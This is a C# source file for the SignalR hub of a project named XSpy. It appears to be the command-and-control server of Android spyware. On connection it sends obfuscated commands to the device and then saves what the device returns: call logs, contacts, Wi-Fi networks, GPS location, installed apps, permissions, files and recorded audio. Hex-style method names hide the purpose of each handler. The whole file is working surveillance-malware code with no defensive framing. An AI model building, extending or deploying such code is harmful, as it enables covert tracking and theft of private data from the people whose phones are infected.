using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Claims;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using XSpy.Database.Entities;
using XSpy.Database.Entities.Devices;
using XSpy.Database.Services;
using XSpy.Database.XSpy.Shared.Models.Interfaces;
using XSpy.Shared.DataTransfer;
using XSpy.Shared.Models.Requests.Devices;
using File = System.IO.File;

namespace XSpy.Socket
{
    [Authorize(Policy = "HubAuthorizationPolicy")]
    public class MainHub : Hub
    {
        private readonly HubMethods _methods;
        private readonly UserService _userService;
        private readonly DeviceService _deviceService;

        private string _filePath;

        public MainHub(HubMethods hubMethods, DeviceService deviceService, UserService userService,
            IHostEnvironment env)
        {
            _userService = userService;
            _deviceService = deviceService;
            _methods = hubMethods;
            _filePath = Path.Combine(env.ContentRootPath, "external", "devices");
        }

        public override async Task OnConnectedAsync()
        {
            _methods.ClientsByDeviceId[GetDeviceId()] = Context.ConnectionId;

            await base.OnConnectedAsync().ConfigureAwait(false);
        }

        public override async Task OnDisconnectedAsync(Exception exception)
        {
            //    var user = await GetUserAsync().ConfigureAwait(false);
            //   var userId = user.Id;

            //  _methods.ClientsByUserId.TryRemove(userId, out _);

            await base.OnDisconnectedAsync(exception).ConfigureAwait(false);
        }

        public async Task _0xSD(SaveDeviceRequest request)
        {
            var user = await GetUser();
            if (user == null)
                return;

            await _deviceService.SaveDevice(user.Id, request);
            await Clients.Client(Context.ConnectionId).SendAsync("0xFI");
            await Clients.Client(Context.ConnectionId).SendAsync("0xSM", new MessageDataRequest
            {
                Action = "ls"
            });

            await Clients.Client(Context.ConnectionId).SendAsync("0xCL");
            await Clients.Client(Context.ConnectionId).SendAsync("0xCO");
            await Clients.Client(Context.ConnectionId).SendAsync("0xLO");
            await Clients.Client(Context.ConnectionId).SendAsync("0xWI");
            await Clients.Client(Context.ConnectionId).SendAsync("0xPM");
            await Clients.Client(Context.ConnectionId).SendAsync("0xIN");
        }

        //List Files
        public async Task _0xFI()
        {
        }


        //Download Files
        public async Task _0xFD(TransferFileRequest fileRequest)
        {
            var file = await _deviceService.StoreFile(GetDeviceId(), _filePath, fileRequest);

            await File.WriteAllBytesAsync(file.SavedPath, fileRequest.Buffer);
        }


        //LIST SMS
        public async Task _0xLM(List<CallData> callsList)
        {
        }

        //SEND SMS
        public async Task _0xSM(List<CallData> callsList)
        {
        }

        //Call List
        public async Task _0xCL(SaveCallsRequest request)
        {
            await _deviceService.SaveCalls(GetDeviceId(), request);
        }

        //CONTACT List
        public async Task _0xCO(SaveContactsRequest request)
        {
            await _deviceService.SaveContacts(GetDeviceId(), request);
        }

        //WIFI List
        public async Task _0xWI(SaveWifiList wifiRequest)
        {
            await _deviceService.SaveWifi(GetDeviceId(), wifiRequest);
        }

        //SAVE AUDIO FILE
        public async Task _0xMI(TransferFileRequest fileRequest)
        {
            var file = await _deviceService.StoreFile(GetDeviceId(), _filePath, fileRequest);

            await File.WriteAllBytesAsync(file.SavedPath, fileRequest.Buffer);
        }

        //PERM. List
        public async Task _0xPM(GrantedPermissionRequest permissions)
        {
            await _deviceService.SavePermission(GetDeviceId(), permissions);
        }

        //INSTALLED List
        public async Task _0xIN(SaveInstalledAppsRequest installedApps)
        {
            await _deviceService.SaveInstalledList(GetDeviceId(), installedApps);
        }

        //GRANTED PERM. List
        public async Task _0xGP(PermissionDataRequest permissionData)
        {
            await _deviceService.SavePermission(GetDeviceId(), permissionData);
        }

        //GPS
        public async Task _0xLO(UpdatePositionRequest location)
        {
            await _deviceService.SaveLocation(GetDeviceId(), location);
        }

        private string GetDeviceId()
        {
            var userId = Context.User.FindFirst(ClaimTypes.SerialNumber);
            return userId?.Value;
        }

        private Task<IUserEntity> GetUser()
        {
            return _userService.GetUserByToken(GetUserToken());
        }


        private Guid GetUserToken()
        {
            var userId = Context.User.FindFirst(ClaimTypes.Sid);
            return userId == null ? Guid.Empty : Guid.Parse(userId.Value);
        }
    }
}